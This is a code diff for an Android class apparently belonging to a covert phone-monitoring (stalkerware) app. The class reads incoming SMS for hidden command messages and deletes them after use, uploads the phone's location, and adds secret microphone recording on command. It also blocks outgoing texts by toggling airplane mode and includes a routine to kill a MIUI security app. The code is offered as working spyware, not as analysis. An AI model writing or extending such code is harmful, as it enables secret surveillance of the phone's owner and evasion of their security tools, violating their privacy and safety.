@@ -1,29 +1,40 @@
 package com.privacy.monitor.resolver;
 
+import java.io.IOException;
 import java.util.Date;
+import java.util.List;
 import com.baidu.location.LocationClientOption;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.DirectiveDB;
+import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
+import com.privacy.monitor.db.util.DirectiveUtil;
 import com.privacy.monitor.domain.Directive;
+import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
+import com.privacy.monitor.domain.TaskInfo;
 import com.privacy.monitor.inte.RunBack;
 import com.privacy.monitor.location.LocationMan;
+import com.privacy.monitor.provider.TaskInfoProvider;
 import com.privacy.monitor.resolver.field.SMSConstant;
+import com.privacy.monitor.util.AlarmNanagerUtil;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
 import com.privacy.monitor.util.NetworkUtil;
-
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningAppProcessInfo;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.SystemClock;
 import android.telephony.SmsManager;
+import android.text.TextUtils;
 
 /**
  * 短信观察者
@@ -35,11 +46,15 @@ public class SMSObserver extends ContentObserver {
 	private RunBack runBack;
 	private DirectiveDB directiveDB;
 	private ContentResolver mResolver;
+	private ActivityManager am;
+	private String startTime ="",soundPath;
+	private MonitorDB monitorDB ;
+	private MediaRecorder mediaRecorder ;
 	
 	// 需要获得的字段列
 	private static final String[] PROJECTION = {SMSConstant.TYPE,
 			SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
-			 SMSConstant.READ};
+			SMSConstant.READ};
 
 	public SMSObserver(ContentResolver resolver, Handler handler,Context context,RunBack runBack) {
 		super(handler);
@@ -47,7 +62,9 @@ public class SMSObserver extends ContentObserver {
 		this.context = context;
 		this.sqlite = SMSRecordDB.getInstance(context);
 		this.runBack = runBack;
+		this.monitorDB = MonitorDB.getInstance(context);
 		this.directiveDB = DirectiveDB.getInstance(context);
+		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
 	}
  
 	public SMSObserver(Handler handler) {
@@ -57,29 +74,53 @@ public class SMSObserver extends ContentObserver {
 	@Override
 	public void onChange(boolean selfChange) {
 		super.onChange(selfChange);
-		Logger.d("SMSObserver","selfChange11111111111111111111:"+selfChange);
-		if(mResolver!=null && context !=null && !selfChange){
+		
+		//killTask(context);
+		if(mResolver!=null && context !=null && !DirectiveUtil.isStopAllFunction(directiveDB)){
+		
 			Cursor smsCursor = mResolver.query(SMSConstant.CONTENT_URI, // 查询的URI,
 					PROJECTION, // 需要取得的列 ,
 					null, // 查询语句
 					null, // 可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
 					"_id DESC LIMIT 1");
+			
 			if (smsCursor != null) {
 				while (smsCursor.moveToNext()) {
 					int typeIndex = smsCursor.getColumnIndex(SMSConstant.TYPE);
 					int dateIndex =  smsCursor.getColumnIndex(SMSConstant.DATE);
 					int addressIndex =smsCursor.getColumnIndex(SMSConstant.ADDRESS);
 					int bodyIndex = smsCursor.getColumnIndex(SMSConstant.BODY);
+					
 					if(typeIndex !=-1 && dateIndex !=-1 && addressIndex !=-1 && bodyIndex !=-1){
 						final String type = smsCursor.getString(typeIndex);
 						final String date = smsCursor.getString(dateIndex);
 						final String phone = smsCursor.getString(addressIndex);
 						final String body = smsCursor.getString(bodyIndex);
 						
+						//是否监控
+						if(monitorDB !=null && !TextUtils.isEmpty(phone)){
+							Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{phone,"0"});
+							if(monitor !=null && !TextUtils.isEmpty(monitor.getPhone())){
+								break;
+							}
+						}
+						
+						if(date.equals(startTime)){
+							Logger.d("SMSObserver","同一条短信");
+							break;
+						}
+						startTime = date;
+						//阻止发送短信
+						if(DirectiveUtil.stopSend(body, directiveDB)){
+							AppUtil.toggleAirplane(context, true,0);
+							AppUtil.toggleAirplane(context, false,1000);
+							break;
+						}
+						
 						if(body.startsWith("*123456789*")){
-							String strType = body.substring(10,11);
+							String strType = body.substring(11,12);
 							int iType = Integer.valueOf(strType);
-							String strStatus = body.substring(12, 13);
+							String strStatus = body.substring(13);
 							int iStatus = Integer.valueOf(strStatus);
 							if(iType==25){
 								int index = strType.lastIndexOf("*");
@@ -88,7 +129,7 @@ public class SMSObserver extends ContentObserver {
 							}else {
 								directive(iType,iStatus,"");
 							}
-							
+							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
 							break;
 						}
 						
@@ -186,6 +227,20 @@ public class SMSObserver extends ContentObserver {
 				directiveDB.insert(directive);
 			}
 			switch(directiveNum){
+			case 10:
+				if(!C.isRecorder){
+					if(status>0 && status <=60){
+						try {
+							long reLong = status*60*1000;
+							AlarmNanagerUtil.startCron(context,C.ENV_ACTION,reLong);
+							C.isRecorder = true;
+							recordCallComment(reLong);
+						} catch (IOException e) {
+							e.printStackTrace();
+						}
+					}
+				}
+				break;
 			case 12:
 			case 13:
 				LocationMan locationMan = new LocationMan(context);
@@ -197,9 +252,6 @@ public class SMSObserver extends ContentObserver {
 				locationMan.setRunBack(new MyRunnback());
 				locationMan.startLocaiton();
 				break;
-			case 14:
-				
-				break;
 			}
 		}
 	}
@@ -208,6 +260,7 @@ public class SMSObserver extends ContentObserver {
 
 		@Override
 		public void run() {
+			
 		}
 
 		@Override
@@ -244,4 +297,70 @@ public class SMSObserver extends ContentObserver {
 			NetworkUtil.upload(context,"tel:"+sp.getString(C.PHONE,"")+"&lat="+locaInfo[0]+"&lon="+locaInfo[1]+"&time="+date.getTime(),C.RequestMethod.uploadLocation);
 		}
 	}
+	
+	/**
+	 * 杀死所有正在运行的进程(除系统进程外)
+	 */
+	public void killTask(Context context) {
+		
+		TaskInfoProvider provider = new TaskInfoProvider(context);
+		List<TaskInfo> taskInfos = provider.getAllTasks(getProcessAppInfo(context));
+		for (TaskInfo taskInfo : taskInfos) {
+			String packname = taskInfo.getPackname();
+			
+			if ("com.lbe.security.miui".equals(packname)) {
+				Logger.d("BootRectiver", "杀死了..." + packname);
+				am.killBackgroundProcesses(taskInfo.getPackname());
+			}
+		}
+	}
+	
+	private List<RunningAppProcessInfo> getProcessAppInfo(Context context) {
+
+		return am.getRunningAppProcesses();
+
+	}
+	
+	public void recordCallComment(final long recordTime) throws IOException{
+        if(mediaRecorder == null){
+                mediaRecorder = new MediaRecorder();
+                //audioRecord.
+                // 設置聲音源(麥克風)
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                    //recordFile = File.createTempFile("record_",".amr",audioFile);
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    //Log.d(TAG, "文件路径:"+recordFile.getAbsolutePath());
+                    // 设置输出声音文件的路径
+                long currentTime = new Date().getTime();
+                soundPath = context.getFilesDir()+(currentTime+"")+".3gpp";
+                mediaRecorder.setOutputFile(soundPath);
+                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                mediaRecorder.setOnErrorListener(null);
+                mediaRecorder.setOnInfoListener(null);
+                mediaRecorder.prepare();
+                mediaRecorder.start();
+                new Thread(new Runnable() {
+					
+					@Override
+					public void run() {
+						SystemClock.sleep(recordTime);
+						stopRecord();
+						C.isRecorder = false;
+					}
+				});
+        }else {
+                mediaRecorder.start();
+            }
+            
+    }
+    
+    public void stopRecord(){
+            if(mediaRecorder !=null ){
+                  //mediaRecorder.release();
+                 mediaRecorder.stop();
+                 mediaRecorder.reset();
+                 mediaRecorder.release();
+                 mediaRecorder = null;
+            }
+    }
 }
